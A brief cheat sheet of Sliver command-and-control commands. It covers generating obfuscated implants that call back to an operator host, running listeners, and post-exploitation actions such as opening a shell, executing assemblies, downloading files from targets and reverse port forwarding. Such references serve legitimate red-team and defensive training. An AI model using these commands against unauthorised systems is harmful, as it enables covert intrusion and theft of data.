# Sliver Commands Cheat Sheet

## Installation and Startup
*   **Start Sliver Server:** `sliver-server`
*   **Start Sliver Client:** `sliver` (Connects to local server)
*   **Connect to Remote Server:** `sliver -c <path_to_config>`

## Generating Implants
*   **Basic Beacon (HTTP/S):** `generate --http <LHOST>:<LPORT> --save /path/to/save`
*   **Basic Session (mTLS):** `generate --mtls <LHOST>:<LPORT> --save /path/to/save`
*   **Obfuscated Implant:** `generate --http <LHOST> --obfuscate --save /path/to/save`
*   **Format Selection:** `generate --http <LHOST> --format shellcode`

## Listeners (Jobs)
*   **Start HTTP/S Listener:** `http`
*   **Start mTLS Listener:** `mtls`
*   **List Active Jobs:** `jobs`
*   **Kill a Job:** `jobs -k <job_id>`

## Interacting with Beacons/Sessions
*   **List Active Sessions:** `sessions`
*   **List Active Beacons:** `beacons`
*   **Interact with Session:** `use <session_id>`
*   **Interact with Beacon:** `use <beacon_id>`
*   **Convert Beacon to Session:** `interactive`

## Post-Exploitation (Inside a Session)
*   **System Info:** `info`
*   **List Processes:** `ps`
*   **Execute Command (Shell):** `shell`
*   **Execute Assembly:** `execute-assembly /path/to/assembly.exe`
*   **Upload File:** `upload <local_path> <remote_path>`
*   **Download File:** `download <remote_path> <local_path>`
*   **Port Forwarding:** `portfwd add -R <remote_port> -L <local_port>`
